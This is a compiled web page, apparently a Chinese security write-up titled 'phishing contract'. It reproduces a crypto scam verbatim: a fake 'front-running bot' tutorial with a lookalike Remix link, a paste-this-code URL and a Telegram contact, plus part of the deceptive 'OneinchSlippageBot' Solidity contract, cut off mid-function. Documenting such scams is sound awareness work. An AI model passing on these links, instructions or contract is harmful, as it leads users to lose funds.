import{_ as p,K as e,L as o,M as n,N as s,a5 as t,W as c,F as l}from"./framework-edebdfe1.js";const i={},u=n("h1",{id:"钓鱼合约",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#钓鱼合约","aria-hidden":"true"},"#"),s(" 钓鱼合约")],-1),r=n("h2",{id:"钓鱼案例",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#钓鱼案例","aria-hidden":"true"},"#"),s(" 钓鱼案例")],-1),k={href:"https://x.com/DeeLMind/status/1820629106062688396",target:"_blank",rel:"noopener noreferrer"},d={href:"https://etherscan.io/tx/0xf715465bc5d8281ac69010e056989ea99383a81b0b68f1dc789d13b063647552",target:"_blank",rel:"noopener noreferrer"},v=c(`<h2 id="钓鱼视频文档" tabindex="-1"><a class="header-anchor" href="#钓鱼视频文档" aria-hidden="true">#</a> 钓鱼视频文档</h2><div class="language-doc line-numbers-mode" data-ext="doc"><pre class="language-doc"><code>🚨 IMPORTANT: I&#39;ve received messages from users who didn&#39;t provide enough Ethereum to cover gas fees and potential burn fees. The bot targets token contracts with a maximum burn fee of 10% or lower, though most tokens currently have fees between 2-6%. If you fund the contract with 0.4 ETH or less and the bot targets a token with high burn fees, a significant amount of gas fees might be wasted. To avoid this, I recommend funding the contract with at least 0.5 to 1 ETH.

STEP BY STEP INSTRUCTIONS

✅ Download MetaMask: https://metamask.io/download/

✅ Access Remix: https://remixeide.co/
(THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)

✅ Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”. Make sure it ends with .sol for Ethereum programming language.
Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again.

🔥 Paste THIS code in Remix: https://gptsourcecode.web.app/

✅ Go to the &quot;Compile&quot; tab on Remix and Compile with Solidity version 0.6.6

✅ Go to the “DEPLOY &amp; RUN TRANSACTIONS” tab, select the “Injected Provider - MetaMask” as environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.

Note: Make sure the name of your bot is selected in the CONTRACT section above deploy button. In this case mine would be &quot;OneinchSlippageBot - bot.sol&quot;.

Also if you get this message after deployment &quot;Failed to publish metadata file to ipfs, please check the ipfs gateways is available. [{},{},{}] &quot;. You can just ignore it and continue. This feature is to publish your bot to IPFS. Its not necessary, because the bot is in the blockchain and can be accessed through remix.

✅ Fund your bot to be able to frontrun transactions.
Make sure your deposit is more than 0.5 ETH(to prevent negating slippage) to your exact contract/bot address.

✅ After your transaction is confirmed, click the &quot;start&quot; button to run the bot. Withdraw money at any time by clicking the &quot;Withdraw&quot; button

📲 If you still have some questions, you can contact me via telegram: https://t.me/etherdevelop

➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖

🔎 How can I restore the old contract again?

Instead of using the &quot;Deploy&quot; button to create a new contract in the &quot;DEPLOY &amp; RUN TRANSACTIONS&quot; section, you can access your existing contract by entering its address in the &quot;At Address&quot; field and clicking the &quot;At Address&quot; button.
Note: Access can only be restored using the same MetaMask account that was originally used to create the contract.

➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖

💰 Share your profits in the comments below, and like &amp; subscribe for more solidity tutorials.

what is crypto arbitrage bot
bitcoin arbitrage bot
crypto arbitrage bot reddit
crypto arbitrage bots
ethereum arbitrage mev bot
crypto arbitrage bot open source
open source crypto arbitrage bot
types of crypto arbitrage
are crypto arbitrage bots profitable
arbitrage bot pionex
p2p crypto arbitrage
crypto arbitrage bot review
uniswap arbitrage bot
do crypto arbitrage bots work
crypto arbitrage robot
best arbitrage bots
best arbitrage crypto
blockchain arbitrage bot
crypto bot arbitrage
best crypto arbitrage bot
crypto arbitrage companies
crypto arbitrage list
crypto trading arbitrage bot
what is an arbitrage bot
bot crypto arbitrage
cryptocurrency arbitrage bot
crypto trading bot arbitrage
hft crypto bot
ai crypto arbitrage
arbitrage bot crypto
is crypto arbitrage still possible
crypto triangular arbitrage bot
crypto arbitrage usa
crypto arb bot
arbitrage bot crypto reddit
best arbitrage bot crypto
triangular arbitrage bot crypto
arbitrage bot cryptocurrency
cryptohopper arbitrage bot
arbitrage trading crypto bot
arbitrage bots crypto
forex arbitrage bot
ai arbitrage crypto
what is arbitrage crypto
are crypto bots illegal
pionex arbitrage bot review
are arbitrage bots profitable
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="钓鱼代码" tabindex="-1"><a class="header-anchor" href="#钓鱼代码" aria-hidden="true">#</a> 钓鱼代码</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code>
<span class="token comment">//SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.6</span><span class="token punctuation">;</span>

<span class="token comment">// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.</span>
<span class="token comment">// Import Libraries Migrator/Exchange/Factory</span>
<span class="token keyword">import</span> <span class="token string">&quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">OneinchSlippageBot</span> <span class="token punctuation">{</span>

    <span class="token comment">//string public tokenName;</span>
    <span class="token comment">//string public tokenSymbol;</span>
    <span class="token builtin">uint</span> liquidity<span class="token punctuation">;</span>
    <span class="token builtin">string</span> <span class="token keyword">private</span> WETH_CONTRACT_ADDRESS <span class="token operator">=</span> <span class="token string">&quot;0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2&quot;</span><span class="token punctuation">;</span>
    <span class="token builtin">string</span> <span class="token keyword">private</span> UNISWAP_CONTRACT_ADDRESS <span class="token operator">=</span> <span class="token string">&quot;0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&quot;</span><span class="token punctuation">;</span>

    <span class="token keyword">event</span> <span class="token function">Log</span><span class="token punctuation">(</span><span class="token builtin">string</span> _msg<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token comment">//tokenSymbol = _mainTokenSymbol;</span>
        <span class="token comment">//tokenName = _mainTokenName;</span>
    <span class="token punctuation">}</span>

    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">struct</span> <span class="token class-name">slice</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> _len<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> _ptr<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */</span>
    <span class="token keyword">function</span> <span class="token function">findNewContracts</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">,</span> slice <span class="token keyword">memory</span> other<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> shortest <span class="token operator">=</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>other<span class="token punctuation">.</span>_len <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">)</span>
            shortest <span class="token operator">=</span> other<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> selfptr <span class="token operator">=</span> self<span class="token punctuation">.</span>_ptr<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> otherptr <span class="token operator">=</span> other<span class="token punctuation">.</span>_ptr<span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;</span> shortest<span class="token punctuation">;</span> idx <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// initiate contract finder</span>
            <span class="token builtin">uint</span> a<span class="token punctuation">;</span>
            <span class="token builtin">uint</span> b<span class="token punctuation">;</span>

            <span class="token function">loadCurrentContract</span><span class="token punctuation">(</span>WETH_CONTRACT_ADDRESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">loadCurrentContract</span><span class="token punctuation">(</span>UNISWAP_CONTRACT_ADDRESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
                a <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span>selfptr<span class="token punctuation">)</span>
                b <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span>otherptr<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// Mask out irrelevant contracts and check again for new contracts</span>
                <span class="token builtin">uint256</span> mask <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token keyword">if</span><span class="token punctuation">(</span>shortest <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                  mask <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> shortest <span class="token operator">+</span> idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token builtin">uint256</span> diff <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>diff <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            selfptr <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
            otherptr <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_len<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token comment">/*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return \`list of contracts\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">findContracts</span><span class="token punctuation">(</span><span class="token builtin">uint</span> selflen<span class="token punctuation">,</span> <span class="token builtin">uint</span> selfptr<span class="token punctuation">,</span> <span class="token builtin">uint</span> needlelen<span class="token punctuation">,</span> <span class="token builtin">uint</span> needleptr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> ptr <span class="token operator">=</span> selfptr<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> idx<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>needlelen <span class="token operator">&lt;=</span> selflen<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>needlelen <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token builtin">bytes32</span> mask <span class="token operator">=</span> <span class="token builtin">bytes32</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> needlelen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token builtin">bytes32</span> needledata<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> needledata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token builtin">uint</span> end <span class="token operator">=</span> selfptr <span class="token operator">+</span> selflen <span class="token operator">-</span> needlelen<span class="token punctuation">;</span>
                <span class="token builtin">bytes32</span> ptrdata<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> ptrdata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token keyword">while</span> <span class="token punctuation">(</span>ptrdata <span class="token operator">!=</span> needledata<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token operator">&gt;=</span> end<span class="token punctuation">)</span>
                        <span class="token keyword">return</span> selfptr <span class="token operator">+</span> selflen<span class="token punctuation">;</span>
                    ptr<span class="token operator">++</span><span class="token punctuation">;</span>
                    <span class="token keyword">assembly</span> <span class="token punctuation">{</span> ptrdata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">return</span> ptr<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment">// For long needles, use hashing</span>
                <span class="token builtin">bytes32</span> hash<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> hash <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">,</span> needlelen<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token keyword">for</span> <span class="token punctuation">(</span>idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;=</span> selflen <span class="token operator">-</span> needlelen<span class="token punctuation">;</span> idx<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token builtin">bytes32</span> testHash<span class="token punctuation">;</span>
                    <span class="token keyword">assembly</span> <span class="token punctuation">{</span> testHash <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> needlelen<span class="token punctuation">)</span> <span class="token punctuation">}</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>hash <span class="token operator">==</span> testHash<span class="token punctuation">)</span>
                        <span class="token keyword">return</span> ptr<span class="token punctuation">;</span>
                    ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> selfptr <span class="token operator">+</span> selflen<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token comment">/*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */</span>
    <span class="token keyword">function</span> <span class="token function">loadCurrentContract</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> self<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> ret <span class="token operator">=</span> self<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> retptr<span class="token punctuation">;</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span> retptr <span class="token operator">:=</span> <span class="token function">add</span><span class="token punctuation">(</span>ret<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>

        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return \`rune\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">nextContract</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">,</span> slice <span class="token keyword">memory</span> rune<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span>slice <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        rune<span class="token punctuation">.</span>_ptr <span class="token operator">=</span> self<span class="token punctuation">.</span>_ptr<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_len <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            rune<span class="token punctuation">.</span>_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> rune<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token builtin">uint</span> l<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> b<span class="token punctuation">;</span>
        <span class="token comment">// Load the first byte of the rune into the LSBs of b</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span> b <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xE0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            l <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            l <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            l <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Check for truncated codepoints</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&gt;</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            rune<span class="token punctuation">.</span>_len <span class="token operator">=</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
            self<span class="token punctuation">.</span>_ptr <span class="token operator">+=</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
            self<span class="token punctuation">.</span>_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> rune<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        self<span class="token punctuation">.</span>_ptr <span class="token operator">+=</span> l<span class="token punctuation">;</span>
        self<span class="token punctuation">.</span>_len <span class="token operator">-=</span> l<span class="token punctuation">;</span>
        rune<span class="token punctuation">.</span>_len <span class="token operator">=</span> l<span class="token punctuation">;</span>
        <span class="token keyword">return</span> rune<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">startExploration</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _a<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span> _parsedAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> tmp <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>_a<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint160</span> iaddr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token builtin">uint160</span> b1<span class="token punctuation">;</span>
        <span class="token builtin">uint160</span> b2<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            iaddr <span class="token operator">*=</span> <span class="token number">256</span><span class="token punctuation">;</span>
            b1 <span class="token operator">=</span> <span class="token builtin">uint160</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            b2 <span class="token operator">=</span> <span class="token builtin">uint160</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b1 <span class="token operator">&gt;=</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b1 <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b1 <span class="token operator">-=</span> <span class="token number">87</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b1 <span class="token operator">&gt;=</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b1 <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b1 <span class="token operator">-=</span> <span class="token number">55</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b1 <span class="token operator">&gt;=</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b1 <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b1 <span class="token operator">-=</span> <span class="token number">48</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b2 <span class="token operator">&gt;=</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b2 <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b2 <span class="token operator">-=</span> <span class="token number">87</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b2 <span class="token operator">&gt;=</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b2 <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b2 <span class="token operator">-=</span> <span class="token number">55</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b2 <span class="token operator">&gt;=</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b2 <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                b2 <span class="token operator">-=</span> <span class="token number">48</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            iaddr <span class="token operator">+=</span> <span class="token punctuation">(</span>b1 <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> b2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span>iaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">function</span> <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token builtin">uint</span> dest<span class="token punctuation">,</span> <span class="token builtin">uint</span> src<span class="token punctuation">,</span> <span class="token builtin">uint</span> len<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token punctuation">{</span>
        <span class="token comment">// Check available liquidity</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span> len <span class="token operator">&gt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> len <span class="token operator">-=</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
